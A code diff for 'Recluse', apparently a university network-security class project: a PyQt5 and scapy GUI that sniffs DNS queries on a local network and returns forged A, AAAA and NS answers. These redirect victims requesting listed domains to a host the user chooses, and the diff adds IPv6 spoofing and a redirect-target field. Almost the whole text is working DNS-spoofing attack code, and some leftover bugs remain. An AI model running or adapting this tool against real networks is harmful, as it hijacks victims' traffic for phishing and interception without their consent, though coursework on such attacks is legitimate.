@@ -1,9 +1,10 @@
 import sys
-import os
+from os import system
 import subprocess
 import re
 from datetime import datetime
 import shutil
+from socket import gethostbyname, getaddrinfo, AF_INET6
 from scapy.all import *
 #from tkinter import filedialog
 from PyQt5.QtCore import *
@@ -18,7 +19,9 @@ class dns_window(QMainWindow):
         self.htmloption = False
         self.running = False
         title = 'Recluse'
-        self.iface = ""
+        self.interface = ""
+        self.Version = "Ubuntu"
+        self.hostdict = {}
         self.setWindowTitle(title)
         self.setGeometry(0,0,500,300) #Set window size
         self.center()
@@ -27,6 +30,7 @@ class dns_window(QMainWindow):
         self.connectbar()
         self.labels()
         self.buttons()
+        self.entryBox()
         self.show()
     def center(self):
         qr = self.frameGeometry() #Get information about the location and size of the window
@@ -44,10 +48,10 @@ class dns_window(QMainWindow):
         view = QMenu("&View",self)
         helps = QMenu("&Help",self)
         #Add actions to menu entities
+        program.addAction(self.versionaction)
         program.addAction(self.startaction)
         program.addAction(self.stopaction)
         program.addAction(self.exitaction)
-        program.addAction(self.versionaction)
         filemenu.addAction(self.uploadaction)
         view.addAction(self.logaction)
         view.addAction(self.sqlaction)
@@ -71,10 +75,10 @@ class dns_window(QMainWindow):
         self.aboutaction = QAction("&About",self)
     def connectbar(self):
         #Set functions that will be triggered by the action options
+        self.versionaction.triggered.connect(self.version)
         self.startaction.triggered.connect(self.start)
         self.stopaction.triggered.connect(self.stop)
         self.exitaction.triggered.connect(self.close)
-        self.versionaction.triggered.connect(self.version)
         self.uploadaction.triggered.connect(self.upload)
         self.logaction.triggered.connect(self.viewlog)
         self.sqlaction.triggered.connect(self.viewsql)
@@ -85,7 +89,30 @@ class dns_window(QMainWindow):
     def stop(self):
         self.Stop()
     def version(self):
-        hold
+        #versionmsg = QMessageBox()
+        #versionmsg.setWindowTitle('OS Version')
+        #versionmsg.setText('Select your operating system')
+        #versionmsg.setIcon(QMessageBox.Question)
+        #verionmsg.setStandardButtons(QtGui.QMessageBox.Windows10 | QtGui.QMessageBox.Ubuntu)
+        Selection = QMessageBox.question(self,'OS Version','Are you using Ubuntu?\nIf using Ubuntu select "Yes"\nIf using Windows select "No"',QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel)
+        
+        if Selection == QMessageBox.Yes:
+            print("Ubuntu")
+            self.Version = "Ubuntu"
+            infoBox = QMessageBox(self)
+            infoBox.setIcon(QMessageBox.Information)
+            infoBox.setWindowTitle("Linux Ubuntu Selected")
+            infoBox.setText("OS has been set to Ubuntu.")
+            infoBox.exec()
+        else:
+            print("Windows")
+            self.Version = "Windows"
+            warnBox = QMessageBox(self)
+            warnBox.setIcon(QMessageBox.Warning)
+            warnBox.setWindowTitle("Windows Warning")
+            warnBox.setText("OS has been set to Windows. However, Its recommended that you use Ubuntu, Windows may cause problems.")
+            warnBox.exec()
+
     def upload(self):
         filename = filedialog.askopenfilename() #Open file explorer to find a particular file
         htmldir = os.getcwd() #Returns current directory of program
@@ -98,13 +125,13 @@ class dns_window(QMainWindow):
     def help(self):
         helpbox = QMessageBox(self)
         helpbox.setWindowTitle("Help")
-        helptext = "To run click start, to stop click stop"
+        helptext = "Default OS: Ubuntu\nTo run click start, to stop click stop\nTo add domains to poison change the domains.txt file\nTo add domains that redirect to a spoofed HTML change the domainsSpoof.txt file\nThis program must be run with root privileges to function properly"
         helpbox.setText(helptext)
         helpbox.exec()
     def about(self):
         aboutbox = QMessageBox(self)
         aboutbox.setWindowTitle("About")
-        abouttext = "A VCU project"
+        abouttext = "A VCU projec\nCMSC414 Computer & Network Security"
         aboutbox.setText(abouttext)
         aboutbox.exec()
 
@@ -114,7 +141,9 @@ class dns_window(QMainWindow):
 
             ipconfig = subprocess.run(['ipconfig','/all'], stdout=subprocess.PIPE).stdout.decode('utf-8')
             ipconfig_lines = ipconfig.splitlines()
+            ipconfig_interface = ipconfig_lines
             ipconfig_lines = [line.replace(" ","") for line in ipconfig_lines if 1==1]
+            ipconfig_interface = [line.strip() for line in ipconfig_interface if 1==1]
             search_key = ipconfig_lines[8].split(":")
 
             found = 0
@@ -122,9 +151,12 @@ class dns_window(QMainWindow):
             MAC = ""
             IP = ""
             Subnet = ""
+            iface = ""
             while found == 0:
                 if(ipconfig_lines[x] == f'Connection-specificDNSSuffix.:{search_key[1]}'):
                     y = x
+                    adapter = ipconfig_interface[x-2]
+                    iface = adapter[17:len(adapter)-1]
                     found = 1
                     temp = ipconfig_lines[y:y+22]
                     MAC = temp[2]
@@ -160,7 +192,7 @@ class dns_window(QMainWindow):
                                     tempARP.append(line)
                         x = x+1
                 x = x+1
-            IPs_MAC.append(IPnum); IPs_MAC.append(MACnum)
+            IPs_MAC.append(IPnum); IPs_MAC.append(MACnum); IPs_MAC.append(iface)
             return IPs_MAC
 
         except:
@@ -227,21 +259,35 @@ class dns_window(QMainWindow):
             print("An error occurred, retry or check your network config")
 
     def IPsMAC(self):
-        IpsMACs = self.netretrieveLinux()
-        HostIP_MAC = []
-        HostIP_MAC.append(IpsMACs[len(IpsMACs)-3]); HostIP_MAC.append(IpsMACs[len(IpsMACs)-2]); 
-        self.hostLabel.setText(f"Host IP: {HostIP_MAC[0]}\nHost MAC: {HostIP_MAC[1]}")
-        self.hostLabel.setAlignment(Qt.AlignLeft)
-        self.hostLabel.resize(200,30)
-        self.hostLabel.move(10,30)
-        self.lists.clear()
-        for x in range(0, len(IpsMACs)-3, 2):
-            IP = QListWidgetItem(f"IP: {IpsMACs[x]} MAC: {IpsMACs[x+1]}")
-            self.lists.addItem(IP)
-        self.iface = IpsMACs[(len(IpsMACs)-1)]
+        if self.Version == "Ubuntu":
+            IpsMACs = self.netretrieveLinux()
+            HostIP_MAC = []
+            HostIP_MAC.append(IpsMACs[len(IpsMACs)-3]); HostIP_MAC.append(IpsMACs[len(IpsMACs)-2]); 
+            self.hostLabel.setText(f"Host IP: {HostIP_MAC[0]}\nHost MAC: {HostIP_MAC[1]}")
+            self.hostLabel.setAlignment(Qt.AlignLeft)
+            self.hostLabel.resize(200,30)
+            self.hostLabel.move(10,30)
+            self.lists.clear()
+            for x in range(0, len(IpsMACs)-3, 2):
+                IP = QListWidgetItem(f"IP: {IpsMACs[x]} MAC: {IpsMACs[x+1]}")
+                self.lists.addItem(IP)
+            self.interface = IpsMACs[(len(IpsMACs)-1)]
+        elif self.Version == "Windows":
+            IpsMACs = self.netretrieveWindows()
+            HostIP_MAC = []
+            HostIP_MAC.append(IpsMACs[len(IpsMACs)-3]); HostIP_MAC.append(IpsMACs[len(IpsMACs)-2]); 
+            self.hostLabel.setText(f"Host IP: {HostIP_MAC[0]}\nHost MAC: {HostIP_MAC[1]}")
+            self.hostLabel.setAlignment(Qt.AlignLeft)
+            self.hostLabel.resize(200,30)
+            self.hostLabel.move(10,30)
+            self.lists.clear()
+            for x in range(0, len(IpsMACs)-3, 2):
+                IP = QListWidgetItem(f"IP: {IpsMACs[x]} MAC: {IpsMACs[x+1]}")
+                self.lists.addItem(IP)
+            self.interface = IpsMACs[(len(IpsMACs)-1)]
             
 
-    #Labels&Buttons
+    #Labels,Buttons&TextBox
     def labels(self):
         self.hostLabel = QLabel(self) #Create Label object
         self.lists = QListWidget(self) #Create list object
@@ -253,6 +299,7 @@ class dns_window(QMainWindow):
         self.domainLabel = QLabel("Domains to Poison",self)
         self.domainLabel.setAlignment(Qt.AlignCenter)
         self.domainLabel.move(320,70)
+        self.domainLabel.resize(110,40)
         self.domainLabel2 = QLabel("HTML to Spoof",self)
         self.domainLabel2.setAlignment(Qt.AlignCenter)
         self.domainLabel2.move(320,190)
@@ -274,6 +321,8 @@ class dns_window(QMainWindow):
         domains = open('domains.txt','r')
         urls = domains.readlines()
         for url in urls:
+            tobytes = bytes(url.strip(), encoding="utf-8")
+            self.hostdict[tobytes] = ""
             self.dropdown.addItem(url.strip())
         self.dropdown.move(320,100)
 
@@ -293,44 +342,54 @@ class dns_window(QMainWindow):
             self.dropdown2.addItem(url.strip())
         self.dropdown2.move(320,220)
     
+    def entryBox(self):
+        self.entryLabel = QLabel("Where to redirect",self)
+        self.entryLabel.setAlignment(Qt.AlignCenter)
+        self.entryLabel.move(320,35)
+        self.entry = QLineEdit(self)
+        self.entry.move(320,60)
+        self.entry.resize(100,20)
+    
     #Spoof/Poison Functions
-    def dnsSpoofLinux(self,pkt):
-        hostDict = { b'www.rbnorway.org',
+    def dnsSpoof(self,pkt):
 
-                    b'rbnorway.org',
-                    b'www.twitter.com',
-                    b'twitter.com',
-                    b'tekkenmods.com',
-                    b'www.gstatic.com',
-                    b'www.yahoo.com',
-                    b'www.nexusmods.com',
-                    b'nexusmods.com',
-                    b'vacu.org',
-                    b'www.vacu.org'
-                    } #Dictionary to catch different ways of searching the domain
-
-        for Names in hostDict: #For loop to check each name in hostDict
-
+        for Names in self.hostdict: #For loop to check each name in hostDict
+        
             if (DNS in pkt and Names in pkt[DNS].qd.qname): #Check if qname in packet matches any domain name in the hostDict
                 print(f'packet found {Names}')
-                print(pkt)
                 if IP in pkt:
-                    print(pkt[IP].src)
-                    print(pkt[IP].dst)
+                    
                     IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst) #Switch source to be destination packet payload is sent back to the victim
                     
                     UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)
 
-                    Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=259200,rdata='128.172.22.56') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
+                    Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=259200,rdata=f'{self.ip}') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
 
-                    NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata='128.172.22.56')
+                    NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata=f'{self.ip}')
 
                     DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)
                     #Set qr to 1 to represent a response packet
 
                     spoofpkt = IPpkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
 
-                    send(spoofpkt,iface=fself.iface)#Send spoofed packet to the the victim
+                    sendp(spoofpkt,iface=self.interface) #Send spoofed packet to the the victim
+
+                elif IPv6 in pkt:
+                    
+                    IPv6pkt = IPv6(dst=pkt[IPv6].src,src=pkt[IPv6].dst) #Switch source to be destination packet payload is sent back to the victim
+                    
+                    UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)
+
+                    Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='AAAA',ttl=259200,rdata=f'{self.ipv6}') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
+
+                    NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata=f'{self.ipv6}')
+
+                    DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)
+                    #Set qr to 1 to represent a response packet
+
+                    spoofpkt = IPv6pkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
+
+                    sendp(spoofpkt,iface=self.interface) #Send spoofed packet to the the victim
 
     def set_spoof(self,radio):
         if radio.text() == "Spoof HTML":
@@ -338,21 +397,44 @@ class dns_window(QMainWindow):
                 htmloption = True
             else:
                 htmloption = False
+
     def Start(self):
         if self.running == False:
             self.running = True
-            if(self.iface == ""):
-                getface = self.netretrieveLinux()
-                self.iface = getface[len(getface)-1]
-            time = datetime.now()
-            self.lists2.addItem(f"Poisoning has begun {time}")
-            pkt=sniff(filter='udp and dst port 53', prn=self.dnsSpoofLinux)
-            print(pkt.summary())
+            if self.Version == "Ubuntu":
+                if(self.interface == ""):
+                    getface = self.netretrieveLinux()
+                    self.interface = getface[len(getface)-1]
+                system('sudo resolvectl flush-caches')
+            elif self.Version == "Windows":
+                if(self.interface == ""):
+                    getface = self.netretrieveWindows()
+                    self.interface = getface[len(getface)-1]
+                system('ipconfig /flushdns')
+            if self.entry.text() != "": 
+                redirect = self.entry.text()
+                self.ip = gethostbyname(redirect)
+                self.ipv6 = ""
+                try:
+                    self.ipv6 = getaddrinfo(redirect,None,AF_INET6)[0][4][0]
+                except:
+                    pass       
+                time = datetime.now()
+                self.lists2.addItem(f"Poisoning has begun {time}")
+                pkt=sniff(filter='udp and dst port 53', prn=self.dnsSpoof)
+                print(pkt.summary())
+            else:
+                warnBox = QMessageBox(self)
+                warnBox.setIcon(QMessageBox.Warning)
+                warnBox.setWindowTitle("Redirect Warning")
+                warnBox.setText("No redirect domain was given")
+                warnBox.exec()
+                self.Stop()
 
     def Stop(self):
         if self.running == True:
             self.running = False
-            time = datetime.datetime.now()
+            time = datetime.now()
             self.lists2.addItem(f"Poisoning has ended {time}")
     
     #Error box
